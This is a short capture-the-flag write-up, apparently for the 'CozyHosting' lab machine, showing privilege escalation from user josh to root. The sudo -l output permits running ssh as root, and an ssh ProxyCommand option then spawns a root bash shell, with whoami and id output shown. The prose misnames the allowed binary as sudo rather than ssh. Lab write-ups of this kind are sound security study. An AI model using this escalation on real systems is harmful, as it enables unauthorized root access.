# Explanation
After getting the ssh session, I decided to run sudo -l which told me that josh has access to run "/usr/bin/sudo" with any parameters. after finding this out, I decided to go on GTFO bins and run the script there to get root access.

# sudo -l
```
josh@cozyhosting:~$ sudo -l
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

# GTFO Bins
![[Pasted image 20230905221832.png]]

# shell
```
josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=';bash 0<&2 1>&2' x
root@cozyhosting:/home/josh# whoami
root
root@cozyhosting:/home/josh# id
uid=0(root) gid=0(root) groups=0(root)
root@cozyhosting:/home/josh# 
```